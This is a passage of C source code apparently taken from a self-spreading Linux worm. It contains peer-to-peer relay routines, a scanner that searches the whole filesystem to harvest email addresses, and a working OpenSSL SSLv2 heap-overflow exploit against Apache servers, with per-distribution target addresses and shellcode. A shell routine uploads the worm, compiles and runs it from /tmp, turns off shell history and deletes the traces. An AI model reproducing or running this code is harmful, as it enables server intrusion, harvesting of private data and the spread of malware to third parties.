   927	int relay(unsigned long server,char *buf,unsigned long len) {
   928		struct ainst ts;
   929		char srv[256];
   930		memset((void*)&ts,0,sizeof(struct ainst));
   931		conv(srv,256,server);
   932		audp_relay(&udpserver,&ts,srv,PORT);
   933		return lowsend(&ts,0,buf,len)?1:0;
   934	}
   935	
   936	void segment(unsigned char low,char *buf, unsigned long len) {
   937		unsigned long a=0,c=0;
   938		char *mbuf=NULL;
   939		if (numlinks == 0 || links == NULL) return;
   940		if (low) mbuf=lowsend(NULL,low,buf,len);
   941		for(;c < 10;c++) {
   942			a=rand()%numlinks;
   943			if (links[a] != myip) {
   944				struct ainst ts;
   945				char srv[256];
   946				memset((void*)&ts,0,sizeof(struct ainst));
   947				conv(srv,256,links[a]);
   948				audp_relay(&udpserver,&ts,srv,PORT);
   949				if (mbuf) audp_send(&ts,mbuf,len+sizeof(struct llheader));
   950				else audp_send(&ts,buf,len);
   951				break;
   952			}
   953		}
   954		FREE(mbuf);
   955	}
   956	
   957	void broadcast(char *buf,unsigned long len) {
   958		struct route_rec rc;
   959		char *str=(char*)malloc(sizeof(struct route_rec)+len+1);
   960		if (str == NULL) return;
   961		memset((void*)&rc,0,sizeof(struct route_rec));
   962		rc.h.tag=0x26;
   963		rc.h.id=rand();
   964		rc.h.len=sizeof(struct route_rec)+len;
   965		rc.h.seq=newseq();
   966		rc.server=0;
   967		rc.sync=syncmodes;
   968		rc.links=numlinks;
   969		rc.hops=5;
   970		memcpy((void*)str,(void*)&rc,sizeof(struct route_rec));
   971		memcpy((void*)(str+sizeof(struct route_rec)),(void*)buf,len);
   972		segment(2,str,sizeof(struct route_rec)+len);
   973		FREE(str);
   974	}
   975	
   976	void syncm(struct ainst *inst,char tag,int id) {
   977		struct addsrv_rec rc;
   978		struct next_rec { unsigned long server; } fc;
   979		unsigned long a,b;
   980		for (b=0;;b+=700) {
   981			unsigned long _numlinks=numlinks-b>700?700:numlinks-b;
   982			unsigned long *_links=links+b;
   983			unsigned char *str;
   984			if (b > numlinks) break;
   985			str=(unsigned char*)malloc(sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
   986			if (str == NULL) return;
   987			memset((void*)&rc,0,sizeof(struct addsrv_rec));
   988			rc.h.tag=tag;
   989			rc.h.id=id;
   990			if (id) rc.h.seq=newseq();
   991			rc.h.len=sizeof(struct next_rec)*_numlinks;
   992			memcpy((void*)str,(void*)&rc,sizeof(struct addsrv_rec));
   993			for (a=0;a<_numlinks;a++) {
   994				memset((void*)&fc,0,sizeof(struct next_rec));
   995				fc.server=_links[a];
   996				memcpy((void*)(str+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec))),(void*)&fc,sizeof(struct next_rec));
   997			}
   998			if (!id) relay(inst->in.sin_addr.s_addr,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
   999			else relayclient(inst,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
  1000			FREE(str);
  1001		}
  1002	}
  1003	
  1004	void senderror(struct ainst *inst, int id, char *buf2) {
  1005		struct data_rec rc;
  1006		char *str,*buf=strdup(buf2);
  1007		memset((void*)&rc,0,sizeof(struct data_rec));
  1008		rc.h.tag=0x45;
  1009		rc.h.id=id;
  1010		rc.h.seq=newseq();
  1011		rc.h.len=strlen(buf2);
  1012		_encrypt(buf,strlen(buf2));
  1013		str=(char*)malloc(sizeof(struct data_rec)+strlen(buf2)+1);
  1014		if (str == NULL) {
  1015			FREE(buf);
  1016			return;
  1017		}
  1018		memcpy((void*)str,(void*)&rc,sizeof(struct data_rec));
  1019		memcpy((void*)(str+sizeof(struct data_rec)),buf,strlen(buf2));
  1020		relayclient(&udpclient,str,sizeof(struct data_rec)+strlen(buf2));
  1021		FREE(str);
  1022		FREE(buf);
  1023	}
  1024	
  1025	//////////////////////////////////////////////////////////////////////////////////////
  1026	//                                      Scan for email                              //
  1027	//////////////////////////////////////////////////////////////////////////////////////
  1028	
  1029	int isgood(char a) {
  1030		if (a >= 'a' && a <= 'z') return 1;
  1031		if (a >= 'A' && a <= 'Z') return 1;
  1032		if (a >= '0' && a <= '9') return 1;
  1033		if (a == '.' || a == '@' || a == '^' || a == '-' || a == '_') return 1;
  1034		return 0;
  1035	}
  1036	
  1037	int islisten(char a) {
  1038		if (a == '.') return 1;
  1039		if (a >= 'a' && a <= 'z') return 1;
  1040		if (a >= 'A' && a <= 'Z') return 1;
  1041		return 0;
  1042	}
  1043	
  1044	struct _linklist {
  1045		char *name;
  1046		struct _linklist *next;
  1047	} *linklist=NULL;
  1048	
  1049	void AddToList(char *str) {
  1050		struct _linklist *getb=linklist,*newb;
  1051		while(getb != NULL) {
  1052			if (!strcmp(str,getb->name)) return;
  1053			getb=getb->next;
  1054		}
  1055		newb=(struct _linklist *)malloc(sizeof(struct _linklist));
  1056		if (newb == NULL) return;
  1057		newb->name=strdup(str);
  1058		newb->next=linklist;
  1059		linklist=newb;
  1060	}
  1061	
  1062	void cleanup(char *buf) {
  1063		while(buf[strlen(buf)-1] == '\n' || buf[strlen(buf)-1] == '\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;
  1064		while(*buf == '\n' || *buf == '\r' || *buf == ' ') {
  1065			unsigned long i;
  1066			for (i=strlen(buf)+1;i>0;i--) buf[i-1]=buf[i];
  1067		}
  1068	}
  1069	
  1070	void ScanFile(char *f) {
  1071		FILE *file=fopen(f,"r");
  1072		unsigned long startpos=0;
  1073		if (file == NULL) return;
  1074		while(1) {
  1075			char buf[2];
  1076			memset(buf,0,2);
  1077			fseek(file,startpos,SEEK_SET);
  1078			fread(buf,1,1,file);
  1079			startpos++;
  1080			if (feof(file)) break;
  1081			if (*buf == '@') {
  1082				char email[256],c,d;
  1083				unsigned long pos=0;
  1084				while(1) {
  1085					unsigned long oldpos=ftell(file);
  1086					fseek(file,-1,SEEK_CUR);
  1087					c=fgetc(file);
  1088					if (!isgood(c)) break;
  1089					fseek(file,-1,SEEK_CUR);
  1090					if (oldpos == ftell(file)) break;
  1091				}
  1092				for (pos=0,c=0,d=0;pos<255;pos++) {
  1093					email[pos]=fgetc(file);
  1094					if (email[pos] == '.') c++;
  1095					if (email[pos] == '@') d++;
  1096					if (!isgood(email[pos])) break;
  1097				}
  1098				email[pos]=0;
  1099				if (c == 0 || d != 1) continue;
  1100				if (email[strlen(email)-1] == '.') email[strlen(email)-1]=0;
  1101				if (*email == '@' || *email == '.' || !*email) continue;
  1102				if (!strcmp(email,"webmaster@mydomain.com")) continue;
  1103				for (pos=0,c=0;pos<strlen(email);pos++) if (email[pos] == '.') c=pos;
  1104				if (c == 0) continue;
  1105				if (!strncmp(email+c,".hlp",4)) continue;
  1106				for (pos=c,d=0;pos<strlen(email);pos++) if (!islisten(email[pos])) d=1;
  1107				if (d == 1) continue;
  1108				AddToList(email);
  1109			}
  1110		}
  1111		fclose(file);
  1112	}
  1113	
  1114	void StartScan() {
  1115		FILE *f;
  1116		f=popen("find / -type f","r");
  1117		if (f == NULL) return;
  1118		while(1) {
  1119			char fullfile[MAXPATH];
  1120			memset(fullfile,0,MAXPATH);
  1121			fgets(fullfile,MAXPATH,f);
  1122			if (feof(f)) break;
  1123			while(fullfile[strlen(fullfile)-1]=='\n' ||
  1124				fullfile[strlen(fullfile)-1] == '\r')
  1125				fullfile[strlen(fullfile)-1]=0;
  1126			if (!strncmp(fullfile,"/proc",5)) continue;
  1127			if (!strncmp(fullfile,"/dev",4)) continue;
  1128			if (!strncmp(fullfile,"/bin",4)) continue;
  1129			ScanFile(fullfile);
  1130		}
  1131	}
  1132	
  1133	//////////////////////////////////////////////////////////////////////////////////////
  1134	//                                    Exploit                                       //
  1135	//////////////////////////////////////////////////////////////////////////////////////
  1136	
  1137	#ifdef SCAN
  1138	#include <openssl/ssl.h>
  1139	#include <openssl/rsa.h>
  1140	#include <openssl/x509.h>
  1141	#include <openssl/evp.h>
  1142	
  1143	char *GetAddress(char *ip) {
  1144		struct sockaddr_in sin;
  1145		fd_set fds;
  1146		int n,d,sock;
  1147		char buf[1024];
  1148		struct timeval tv;
  1149		sock = socket(PF_INET, SOCK_STREAM, 0);
  1150		sin.sin_family = PF_INET;
  1151		sin.sin_addr.s_addr = inet_addr(ip);
  1152		sin.sin_port = htons(80);
  1153		if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) return NULL;
  1154		write(sock,"GET / HTTP/1.1\r\n\r\n",strlen("GET / HTTP/1.1\r\n\r\n"));
  1155		tv.tv_sec = 15;
  1156		tv.tv_usec = 0;
  1157		FD_ZERO(&fds);
  1158		FD_SET(sock, &fds);
  1159		memset(buf, 0, sizeof(buf));
  1160		if(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
  1161			if(FD_ISSET(sock, &fds)) {
  1162				if((n = read(sock, buf, sizeof(buf) - 1)) < 0) return NULL;
  1163				for (d=0;d<n;d++) if (!strncmp(buf+d,"Server: ",strlen("Server: "))) {
  1164					char *start=buf+d+strlen("Server: ");
  1165					for (d=0;d<strlen(start);d++) if (start[d] == '\n') start[d]=0;
  1166					cleanup(start);
  1167					return strdup(start);
  1168				}
  1169			}
  1170		}
  1171		return NULL;
  1172	}
  1173	
  1174	#define	ENC(c) ((c) ? ((c) & 077) + ' ': '`')
  1175	
  1176	int sendch(int sock,int buf) {
  1177		char a[2];
  1178		int b=1;
  1179		if (buf == '`' || buf == '\\' || buf == '$') {
  1180			a[0]='\\';
  1181			a[1]=0;
  1182			b=write(sock,a,1);
  1183		}
  1184		if (b <= 0) return b;
  1185		a[0]=buf;
  1186		a[1]=0;
  1187		return write(sock,a,1);
  1188	}
  1189	
  1190	int writem(int sock, char *str) {
  1191		return write(sock,str,strlen(str));
  1192	}
  1193	
  1194	int encode(int a) {
  1195		register int ch, n;
  1196		register char *p;
  1197		char buf[80];
  1198		FILE *in;
  1199		if ((in=fopen(WORMSRC,"r")) == NULL) return 0;
  1200		writem(a,UUHEAD);
  1201		while ((n = fread(buf, 1, 45, in))) {
  1202			ch = ENC(n);
  1203			if (sendch(a,ch) <= ASUCCESS) break;
  1204			for (p = buf; n > 0; n -= 3, p += 3) {
  1205				if (n < 3) {
  1206					p[2] = '\0';
  1207					if (n < 2) p[1] = '\0';
  1208				}
  1209				ch = *p >> 2;
  1210				ch = ENC(ch);
  1211				if (sendch(a,ch) <= ASUCCESS) break;
  1212				ch = ((*p << 4) & 060) | ((p[1] >> 4) & 017);
  1213				ch = ENC(ch);
  1214				if (sendch(a,ch) <= ASUCCESS) break;
  1215				ch = ((p[1] << 2) & 074) | ((p[2] >> 6) & 03);
  1216				ch = ENC(ch);
  1217				if (sendch(a,ch) <= ASUCCESS) break;
  1218				ch = p[2] & 077;
  1219				ch = ENC(ch);
  1220				if (sendch(a,ch) <= ASUCCESS) break;
  1221			}
  1222			ch='\n';
  1223			if (sendch(a,ch) <= ASUCCESS) break;
  1224			usleep(10);
  1225		}
  1226		if (ferror(in)) {
  1227			fclose(in);
  1228			return 0;
  1229		}
  1230		ch = ENC('\0');
  1231		sendch(a,ch);
  1232		ch = '\n';
  1233		sendch(a,ch);
  1234		writem(a,"end\n");
  1235		if (in) fclose(in);
  1236		return 1;
  1237	}
  1238	
  1239	#define MAX_ARCH 21
  1240	
  1241	struct archs {
  1242		char *os;
  1243		char *apache;
  1244		int func_addr;
  1245	} architectures[] = {
  1246		{"Gentoo", "", 0x08086c34},
  1247		{"Debian", "1.3.26", 0x080863cc},
  1248		{"Red-Hat", "1.3.6", 0x080707ec},
  1249		{"Red-Hat", "1.3.9", 0x0808ccc4},
  1250		{"Red-Hat", "1.3.12", 0x0808f614},
  1251		{"Red-Hat", "1.3.12", 0x0809251c},
  1252		{"Red-Hat", "1.3.19", 0x0809af8c},
  1253		{"Red-Hat", "1.3.20", 0x080994d4},
  1254		{"Red-Hat", "1.3.26", 0x08161c14},
  1255		{"Red-Hat", "1.3.23", 0x0808528c},
  1256		{"Red-Hat", "1.3.22", 0x0808400c},
  1257		{"SuSE", "1.3.12", 0x0809f54c},
  1258		{"SuSE", "1.3.17", 0x08099984},
  1259		{"SuSE", "1.3.19", 0x08099ec8},
  1260		{"SuSE", "1.3.20", 0x08099da8},
  1261		{"SuSE", "1.3.23", 0x08086168},
  1262		{"SuSE", "1.3.23", 0x080861c8},
  1263		{"Mandrake", "1.3.14", 0x0809d6c4},
  1264		{"Mandrake", "1.3.19", 0x0809ea98},
  1265		{"Mandrake", "1.3.20", 0x0809e97c},
  1266		{"Mandrake", "1.3.23", 0x08086580},
  1267		{"Slackware", "1.3.26", 0x083d37fc},
  1268		{"Slackware", "1.3.26",0x080b2100}
  1269	};
  1270	
  1271	extern int errno;
  1272	
  1273	int cipher;
  1274	int ciphers;
  1275	
  1276	#define FINDSCKPORTOFS	   208 + 12 + 46
  1277	
  1278	unsigned char overwrite_session_id_length[] =
  1279		"AAAA"
  1280		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
  1281		"\x70\x00\x00\x00";
  1282	
  1283	unsigned char overwrite_next_chunk[] =
  1284		"AAAA"
  1285		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
  1286		"AAAA"
  1287		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
  1288		"AAAA"
  1289		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
  1290		"AAAA"
  1291		"\x00\x00\x00\x00"
  1292		"\x00\x00\x00\x00"
  1293		"AAAA"
  1294		"\x01\x00\x00\x00"
  1295		"AAAA"
  1296		"AAAA"
  1297		"AAAA"
  1298		"\x00\x00\x00\x00"
  1299		"AAAA"
  1300		"\x00\x00\x00\x00"
  1301		"\x00\x00\x00\x00\x00\x00\x00\x00"
  1302		"AAAAAAAA"
  1303	
  1304		"\x00\x00\x00\x00"
  1305		"\x11\x00\x00\x00"
  1306		"fdfd"
  1307		"bkbk"
  1308		"\x10\x00\x00\x00"
  1309		"\x10\x00\x00\x00"
  1310	
  1311		"\xeb\x0a\x90\x90"
  1312		"\x90\x90\x90\x90"
  1313		"\x90\x90\x90\x90"
  1314	
  1315		"\x31\xdb"
  1316		"\x89\xe7"
  1317		"\x8d\x77\x10"
  1318		"\x89\x77\x04"
  1319		"\x8d\x4f\x20"
  1320		"\x89\x4f\x08"
  1321		"\xb3\x10"
  1322		"\x89\x19"
  1323		"\x31\xc9"
  1324		"\xb1\xff"
  1325		"\x89\x0f"
  1326		"\x51"
  1327		"\x31\xc0"
  1328		"\xb0\x66"
  1329		"\xb3\x07"
  1330		"\x89\xf9"
  1331		"\xcd\x80"
  1332		"\x59"
  1333		"\x31\xdb"
  1334		"\x39\xd8"
  1335		"\x75\x0a"
  1336		"\x66\xb8\x12\x34"
  1337		"\x66\x39\x46\x02"
  1338		"\x74\x02"
  1339		"\xe2\xe0"
  1340		"\x89\xcb"
  1341		"\x31\xc9"
  1342		"\xb1\x03"
  1343		"\x31\xc0"
  1344		"\xb0\x3f"
  1345		"\x49"
  1346		"\xcd\x80"
  1347		"\x41"
  1348		"\xe2\xf6"
  1349	
  1350		"\x31\xc9"
  1351		"\xf7\xe1"
  1352		"\x51"
  1353		"\x5b"
  1354		"\xb0\xa4"
  1355		"\xcd\x80"
  1356	
  1357		"\x31\xc0"
  1358		"\x50"
  1359		"\x68""//sh"
  1360		"\x68""/bin"
  1361		"\x89\xe3"
  1362		"\x50"
  1363		"\x53"
  1364		"\x89\xe1"
  1365		"\x99"
  1366		"\xb0\x0b"
  1367		"\xcd\x80";
  1368	
  1369	#define BUFSIZE 16384
  1370	#define CHALLENGE_LENGTH 16
  1371	#define RC4_KEY_LENGTH 16
  1372	#define RC4_KEY_MATERIAL_LENGTH (RC4_KEY_LENGTH*2)
  1373	#define n2s(c,s)	((s=(((unsigned int)(c[0]))<< 8)| (((unsigned int)(c[1]))	 )),c+=2)
  1374	#define s2n(s,c)	((c[0]=(unsigned char)(((s)>> 8)&0xff), c[1]=(unsigned char)(((s)	 )&0xff)),c+=2)
  1375	
  1376	typedef struct {
  1377		int sock;
  1378		unsigned char challenge[CHALLENGE_LENGTH];
  1379		unsigned char master_key[RC4_KEY_LENGTH];
  1380		unsigned char key_material[RC4_KEY_MATERIAL_LENGTH];
  1381		int conn_id_length;
  1382		unsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];
  1383		X509 *x509;
  1384		unsigned char* read_key;
  1385		unsigned char* write_key;
  1386		RC4_KEY* rc4_read_key;
  1387		RC4_KEY* rc4_write_key;
  1388		int read_seq;
  1389		int write_seq;
  1390		int encrypted;
  1391	} ssl_conn;
  1392	
  1393	long getip(char *hostname) {
  1394		struct hostent *he;
  1395		long ipaddr;
  1396		if ((ipaddr = inet_addr(hostname)) < 0) {
  1397			if ((he = gethostbyname(hostname)) == NULL) exit(-1);
  1398			memcpy(&ipaddr, he->h_addr, he->h_length);
  1399		}	
  1400		return ipaddr;
  1401	}
  1402	
  1403	int sh(int sockfd) {
  1404		char localip[256], rcv[1024];
  1405		fd_set rset;
  1406		int maxfd, n;
  1407	
  1408	  alarm(3600);
  1409	  conv(localip,256,myip); memset(rcv,0,1024);
  1410	// aion
  1411	  writem(sockfd,"export TERM=xterm;export HOME=/tmp;export HISTFILE=/dev/null;"
  1412			"export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin;"
  1413			"exec bash -i\n");
  1414	  writem(sockfd,"rm -rf /tmp/.unlock.uu /tmp/.unlock.c /tmp/.update.c "
  1415	                "       /tmp/httpd /tmp/update /tmp/.unlock; \n");
  1416	  writem(sockfd,"cat > /tmp/.unlock.uu << __eof__; \n");
  1417	  zhdr(1);  
  1418	  encode(sockfd);
  1419	  zhdr(0);
  1420	  writem(sockfd,"__eof__\n");
  1421	  writem(sockfd,"uudecode -o /tmp/.unlock /tmp/.unlock.uu;   "
  1422	                "tar xzf /tmp/.unlock -C /tmp/;              "
  1423			"gcc -o /tmp/httpd  /tmp/.unlock.c -lcrypto; "
  1424			"gcc -o /tmp/update /tmp/.update.c;\n");
  1425	  sprintf(rcv,  "/tmp/httpd %s; /tmp/update; \n",localip);
  1426	  writem(sockfd,rcv); sleep(3);
  1427	  writem(sockfd,"rm -rf /tmp/.unlock.uu /tmp/.unlock.c /tmp/.update.c "
  1428	                "       /tmp/httpd /tmp/update; exit; \n");
  1429	  for (;;) {
  1430	    FD_ZERO(&rset);
  1431	    FD_SET(sockfd, &rset);
  1432	    select(sockfd+1, &rset, NULL, NULL, NULL);
  1433	    if (FD_ISSET(sockfd, &rset)) if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) return 0;
  1434	  }
  1435	}
  1436	
  1437	int get_local_port(int sock) {
  1438		struct sockaddr_in s_in;
  1439		unsigned int namelen = sizeof(s_in);
  1440		if (getsockname(sock, (struct sockaddr *)&s_in, &namelen) < 0) exit(1);
  1441		return s_in.sin_port;
  1442	}
  1443	
  1444	int connect_host(char* host, int port) {
  1445		struct sockaddr_in s_in;
  1446		int sock;
  1447		s_in.sin_family = AF_INET;
  1448		s_in.sin_addr.s_addr = getip(host);
  1449		s_in.sin_port = htons(port);
  1450		if ((sock = socket(AF_INET, SOCK_STREAM, 0)) <= 0) exit(1);
  1451		alarm(10);
  1452		if (connect(sock, (struct sockaddr *)&s_in, sizeof(s_in)) < 0) exit(1); 
  1453		alarm(0);
  1454		return sock;
  1455	}
  1456	
  1457	ssl_conn* ssl_connect_host(char* host, int port) {
  1458		ssl_conn* ssl;
  1459		if (!(ssl = (ssl_conn*) malloc(sizeof(ssl_conn)))) exit(1);
  1460		ssl->encrypted = 0;
  1461		ssl->write_seq = 0;
  1462		ssl->read_seq = 0;
  1463		ssl->sock = connect_host(host, port);
  1464		return ssl;
  1465	}
  1466	
  1467	char res_buf[30];
  1468	
  1469	int read_data(int sock, unsigned char* buf, int len) {
  1470		int l;
  1471		int to_read = len;
  1472		do {
  1473			if ((l = read(sock, buf, to_read)) < 0) exit(1);
  1474			to_read -= len;
  1475		} while (to_read > 0);
  1476		return len;
  1477	}
  1478	
  1479	int read_ssl_packet(ssl_conn* ssl, unsigned char* buf, int buf_size) {
  1480		int rec_len, padding;
  1481		read_data(ssl->sock, buf, 2);
  1482		if ((buf[0] & 0x80) == 0) {
  1483			rec_len = ((buf[0] & 0x3f) << 8) | buf[1];
  1484			read_data(ssl->sock, &buf[2], 1);
  1485			padding = (int)buf[2];
  1486		}
  1487		else {
  1488			rec_len = ((buf[0] & 0x7f) << 8) | buf[1];
  1489			padding = 0;
  1490		}
  1491		if ((rec_len <= 0) || (rec_len > buf_size)) exit(1);
  1492		read_data(ssl->sock, buf, rec_len);
  1493		if (ssl->encrypted) {
  1494			if (MD5_DIGEST_LENGTH + padding >= rec_len) {
  1495				if ((buf[0] == SSL2_MT_ERROR) && (rec_len == 3)) return 0;
  1496				else exit(1);
  1497			}
  1498			RC4(ssl->rc4_read_key, rec_len, buf, buf);
  1499			rec_len = rec_len - MD5_DIGEST_LENGTH - padding;
  1500			memmove(buf, buf + MD5_DIGEST_LENGTH, rec_len);
  1501		}
  1502		if (buf[0] == SSL2_MT_ERROR) {
  1503			if (rec_len != 3) exit(1);
  1504			else return 0;
  1505		}
  1506		return rec_len;
  1507	}
  1508	
  1509	void send_ssl_packet(ssl_conn* ssl, unsigned char* rec, int rec_len) {
  1510		unsigned char buf[BUFSIZE];
  1511		unsigned char* p;
  1512		int tot_len;
  1513		MD5_CTX ctx;
  1514		int seq;
  1515		if (ssl->encrypted) tot_len = rec_len + MD5_DIGEST_LENGTH;
  1516		else tot_len = rec_len;
  1517	
  1518		if (2 + tot_len > BUFSIZE) exit(1);
  1519	
  1520		p = buf;
  1521		s2n(tot_len, p);
  1522	
  1523		buf[0] = buf[0] | 0x80;
  1524	
  1525		if (ssl->encrypted) {
  1526			seq = ntohl(ssl->write_seq);
  1527	
  1528			MD5_Init(&ctx);
  1529			MD5_Update(&ctx, ssl->write_key, RC4_KEY_LENGTH);
  1530			MD5_Update(&ctx, rec, rec_len);
  1531			MD5_Update(&ctx, &seq, 4);
  1532			MD5_Final(p, &ctx);
  1533	
  1534			p+=MD5_DIGEST_LENGTH;
  1535	
  1536			memcpy(p, rec, rec_len);
  1537	
  1538			RC4(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);
  1539		}
  1540		else memcpy(p, rec, rec_len);
  1541	
  1542		send(ssl->sock, buf, 2 + tot_len, 0);
  1543	
  1544		ssl->write_seq++;
  1545	}
  1546	
  1547	void send_client_hello(ssl_conn *ssl) {
  1548		int i;
  1549		unsigned char buf[BUFSIZE] =
  1550			"\x01"
  1551			"\x00\x02"
  1552			"\x00\x18"
  1553			"\x00\x00"
  1554			"\x00\x10"
  1555			"\x07\x00\xc0\x05\x00\x80\x03\x00"
  1556			"\x80\x01\x00\x80\x08\x00\x80\x06"
  1557			"\x00\x40\x04\x00\x80\x02\x00\x80"
  1558			"";
  1559		for (i = 0; i < CHALLENGE_LENGTH; i++) ssl->challenge[i] = (unsigned char) (rand() >> 24);
  1560		memcpy(&buf[33], ssl->challenge, CHALLENGE_LENGTH);
  1561		send_ssl_packet(ssl, buf, 33 + CHALLENGE_LENGTH);
  1562	}
  1563	
  1564	void get_server_hello(ssl_conn* ssl) {
  1565		unsigned char buf[BUFSIZE];
  1566		unsigned char *p, *end;
  1567		int len;
  1568		int server_version, cert_length, cs_length, conn_id_length;
  1569		int found;
  1570	
  1571		if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);
  1572		if (len < 11) exit(1);
  1573	
  1574		p = buf;
  1575	
  1576		if (*(p++) != SSL2_MT_SERVER_HELLO) exit(1);
  1577		if (*(p++) != 0) exit(1);
  1578		if (*(p++) != 1) exit(1);
  1579		n2s(p, server_version);
  1580		if (server_version != 2) exit(1);
  1581	
  1582		n2s(p, cert_length);
  1583		n2s(p, cs_length);
  1584		n2s(p, conn_id_length);
  1585	
  1586		if (len != 11 + cert_length + cs_length + conn_id_length) exit(1);
  1587		ssl->x509 = NULL;
  1588		ssl->x509=d2i_X509(NULL,&p,(long)cert_length);
  1589		if (ssl->x509 == NULL) exit(1);
  1590		if (cs_length % 3 != 0) exit(1);
  1591	
  1592		found = 0;
  1593		for (end=p+cs_length; p < end; p += 3) if ((p[0] == 0x01) && (p[1] == 0x00) && (p[2] == 0x80)) found = 1;
  1594	
  1595		if (!found) exit(1);
  1596	
  1597		if (conn_id_length > SSL2_MAX_CONNECTION_ID_LENGTH) exit(1);
  1598	
  1599		ssl->conn_id_length = conn_id_length;
  1600		memcpy(ssl->conn_id, p, conn_id_length);
  1601	}
  1602	
  1603	void send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int key_arg_overwrite_len) {
  1604		int encrypted_key_length, key_arg_length, record_length;
  1605		unsigned char* p;
  1606		int i;
  1607		EVP_PKEY *pkey=NULL;
  1608		unsigned char buf[BUFSIZE] =
  1609			"\x02"
  1610			"\x01\x00\x80"
  1611			"\x00\x00"
  1612			"\x00\x40"
  1613			"\x00\x08";
  1614		p = &buf[10];
  1615		for (i = 0; i < RC4_KEY_LENGTH; i++) ssl->master_key[i] = (unsigned char) (rand() >> 24);
  1616		pkey=X509_get_pubkey(ssl->x509);
  1617		if (!pkey) exit(1);
  1618		if (pkey->type != EVP_PKEY_RSA) exit(1);
  1619		encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa, RSA_PKCS1_PADDING);
  1620		if (encrypted_key_length <= 0) exit(1);
  1621		p += encrypted_key_length;
  1622		if (key_arg_overwrite) {
  1623			for (i = 0; i < 8; i++) *(p++) = (unsigned char) (rand() >> 24);
  1624			memcpy(p, key_arg_overwrite, key_arg_overwrite_len);
  1625			key_arg_length = 8 + key_arg_overwrite_len;
  1626		}
  1627		else key_arg_length = 0;
  1628		p = &buf[6];
  1629		s2n(encrypted_key_length, p);
  1630		s2n(key_arg_length, p);
  1631		record_length = 10 + encrypted_key_length + key_arg_length;
  1632		send_ssl_packet(ssl, buf, record_length);
  1633		ssl->encrypted = 1;
  1634	}
  1635	
  1636	void generate_key_material(ssl_conn* ssl) {
  1637		unsigned int i;
  1638		MD5_CTX ctx;
  1639		unsigned char *km;
  1640		unsigned char c='0';
  1641		km=ssl->key_material;
  1642		for (i=0; i<RC4_KEY_MATERIAL_LENGTH; i+=MD5_DIGEST_LENGTH) {
  1643			MD5_Init(&ctx);
  1644			MD5_Update(&ctx,ssl->master_key,RC4_KEY_LENGTH);
  1645			MD5_Update(&ctx,&c,1);
  1646			c++;
  1647			MD5_Update(&ctx,ssl->challenge,CHALLENGE_LENGTH);
  1648			MD5_Update(&ctx,ssl->conn_id, ssl->conn_id_length);
  1649			MD5_Final(km,&ctx);
  1650			km+=MD5_DIGEST_LENGTH;
  1651		}
  1652	}
  1653	
  1654	void generate_session_keys(ssl_conn* ssl) {
  1655		generate_key_material(ssl);
  1656		ssl->read_key = &(ssl->key_material[0]);
  1657		ssl->rc4_read_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
  1658		RC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);
  1659		ssl->write_key = &(ssl->key_material[RC4_KEY_LENGTH]);
  1660		ssl->rc4_write_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
  1661		RC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);
  1662	}
  1663	
  1664	void get_server_verify(ssl_conn* ssl) {
  1665		unsigned char buf[BUFSIZE];
  1666		int len;
  1667		if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);
  1668		if (len != 1 + CHALLENGE_LENGTH) exit(1);
  1669		if (buf[0] != SSL2_MT_SERVER_VERIFY) exit(1);
  1670		if (memcmp(ssl->challenge, &buf[1], CHALLENGE_LENGTH)) exit(1);
  1671	}
  1672	
  1673	void send_client_finished(ssl_conn* ssl) {
  1674		unsigned char buf[BUFSIZE];
  1675		buf[0] = SSL2_MT_CLIENT_FINISHED;
  1676		memcpy(&buf[1], ssl->conn_id, ssl->conn_id_length);
  1677		send_ssl_packet(ssl, buf, 1+ssl->conn_id_length);
  1678	}
  1679	
  1680	void get_server_finished(ssl_conn* ssl) {
  1681		unsigned char buf[BUFSIZE];
  1682		int len;
  1683		int i;
  1684		if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);
  1685		if (buf[0] != SSL2_MT_SERVER_FINISHED) exit(1);
  1686		if (len <= 112) exit(1);
  1687		cipher = *(int*)&buf[101];
  1688		ciphers = *(int*)&buf[109];
  1689	}
  1690	
  1691	void get_server_error(ssl_conn* ssl) {
  1692		unsigned char buf[BUFSIZE];
  1693		int len;
  1694		if ((len = read_ssl_packet(ssl, buf, sizeof(buf))) > 0) exit(1);
  1695	}
  1696	
  1697	void exploit(char *ip) {
  1698		int port = 443;
  1699		int i;
  1700		int arch=-1;
  1701		int N = 20;
  1702		ssl_conn* ssl1;
  1703		ssl_conn* ssl2;
  1704		char *a;
  1705	
  1706		alarm(3600);
  1707		if ((a=GetAddress(ip)) == NULL) exit(0);
  1708		if (strncmp(a,"Apache",6)) exit(0);
  1709		for (i=0;i<MAX_ARCH;i++) {
  1710			if (strstr(a,architectures[i].apache) && strstr(a,architectures[i].os)) {
  1711				arch=i;
  1712				break;
  1713			}
  1714		}
  1715		if (arch == -1) arch=9;
  1716	
  1717		srand(0x31337);
  1718	
  1719		for (i=0; i<N; i++) {
  1720			connect_host(ip, port);
  1721			usleep(100000);
  1722		}
  1723	
  1724		ssl1 = ssl_connect_host(ip, port);
  1725		ssl2 = ssl_connect_host(ip, port);
